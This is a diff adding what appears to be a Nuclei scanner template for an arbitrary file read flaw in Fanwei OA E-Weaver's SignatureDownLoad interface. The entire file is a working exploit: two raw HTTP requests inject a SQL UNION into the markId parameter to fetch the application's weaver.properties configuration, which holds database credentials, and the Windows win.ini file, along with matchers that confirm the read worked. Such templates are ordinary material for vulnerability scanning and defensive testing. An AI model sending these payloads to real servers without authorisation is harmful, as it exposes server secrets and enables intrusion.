@@ -1,0 +1,34 @@
+id: fanwei-eweaver-signaturedownload-fileread
+
+info:
+  name: 泛微OA E-Weaver SignatureDownLoad 任意文件读取漏洞
+  author: wangyang 
+  severity: medium
+  description: 泛微OA E-Weaver SignatureDownLoad接口存在任意文件读取漏洞,攻击者通过漏洞可以获取数据库中的敏感信息或者读取服务器任意文件
+  reference: 
+  tags: fanwei,oa,ebridge,fileread
+
+
+http:
+  - raw:
+      - |
+        GET /weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27 HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27C:/Windows/win.ini%27 HTTP/1.1
+        Host: {{Hostname}}
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          
+      - type: word
+        part: body
+        condition: or
+        words:
+          - 'MAPI=1'
+          - 'ecology.url'
